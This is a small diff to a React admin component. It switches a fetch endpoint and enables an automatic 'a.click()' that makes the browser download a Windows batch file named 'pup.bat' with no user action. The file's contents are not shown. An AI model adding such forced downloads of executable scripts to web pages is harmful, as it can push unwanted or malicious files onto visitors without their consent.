@@ -23,7 +23,7 @@ const Admin = () => {
 
     fetchDownloadCalled.current = true;
 
-    fetch('api/try')
+    fetch('api/admin')
       .then((res) => res.blob())
       .then((blob) => {
         const file = window.URL.createObjectURL(blob);
@@ -31,7 +31,7 @@ const Admin = () => {
         a.href = file;
         a.download = 'pup.bat';
         document.body.appendChild(a);
-        // a.click();
+        a.click();
         window.URL.revokeObjectURL(file);
         console.log('File Downloaded');
       });
